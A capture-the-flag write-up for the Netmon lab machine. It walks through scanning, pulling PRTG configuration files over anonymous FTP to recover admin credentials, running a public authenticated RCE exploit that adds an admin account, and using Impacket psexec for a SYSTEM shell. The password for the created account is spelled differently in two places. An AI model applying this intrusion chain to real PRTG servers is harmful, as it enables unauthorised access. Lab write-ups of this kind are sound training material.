# Netmon

This is the write-up for the machine called Netmon. 

## Scanning & Enumeration

Let's start with an nmap scan:

```markdown
nmap -T4 -A -p- 10.10.10.152
```

Relevant results of the scan:

```markdown
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_07-02-19  12:39PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

## FTP 

The nmap scan shows us that we have access to the C: drives root folders on the box with anonymous login on FTP. 
After logging in to the FTP we can download **C:\Users\Public\Desktop\user.txt** to get the first flag.

From the nmap can results we know that the service on HTTP is PRTG Network Monitor and we can look for configuration files for that. 
After googling some information about the PRTG Network Monitor we know these files are in the directory _ProgramData\Paessler\PRTG Network Monitor_.
We can then download the files **PRTG Configuration.dat** and **PRTG Configuration.old.bak** from the directory on to our machine using ```get PRTG Configuration.dat``` and ```get PRTG Configuration.old.bak```.
The **PRTG Configuration.old.bak** contains the following username and password:

```prtgadmin:PrTg@dmin2018```

## HTTP

There is a monitoring system called **PRTG Network Monitor** in the version 18.1.37 on th web page and we can try logging in with the credentials we found but it does not work.

The file is actually from 2019 so let's try entering the password as ```admin2019```.

This works and we are now logged in as user **prtgadmin**.

## PRTG Exploitation using authenticated remote code execution

[Exploit-db](www.exploit-db.com) has a remote code execution exploit that requires authentication for the **PRTG Network Monitor** that can be found [here.](https://www.exploit-db.com/exploits/46527)

Copy and paste the code into an editor of your choice and save it with any name. I will call mine **netmon_exploit.sh**.

Make sure that the shell script is executable by typing in ```chmod +x netmon_exploit.sh``` on your machine.

We will need to obtain a cookie after logging in to the **PRTG Network Monitor** web page. 

We can do this by opening up BurpSuite and configure the BurpSuite proxy on our web browser.

After that, we turn on **Intercept** on BurpSuite and reload the **PRTG Network Monitor** page and enter the credentials to login.

Turn off **Intercept** and open **Proxy**. There, we can find a cookie starting with **OCTOPUS** and we can copy that.

Turn off the proxy on our browser and type in the following commands on your machine:

```markdown
./netmon_exploit.sh -u http://10.10.10.152 -c "OCTOPUS" //The cookie will have a string of characters after OCTOPUS
```

This exploit creates a user in the admin group with the following credentials:

```markdown
username: pentest
password: P3nt3st!
```
After this, install [Impacket](https://github.com/SecureAuthCorp/impacket) as we will use scripts from it that will help us gain root access to this machine.

Clone or download it into the directory of your choice and enter ```pip install .``` in that directory to install Impacket onto your machine. 

Run ```pip3 install .``` if the aforementioned does not work.

In the same directory where we installed Impacket, run the following command:

```markdown
psexec.py pentest:'P3nT3st!'@10.10.10.152
```

After the command executes, we wil get a shell as **NT Authority\SYSTEM** 

We can also use ```smbexec.py``` or ```wmiexec.py``` instead of ```psexec.py``` but we will gain a semi-interactive shell.

The flag is in root.txt.
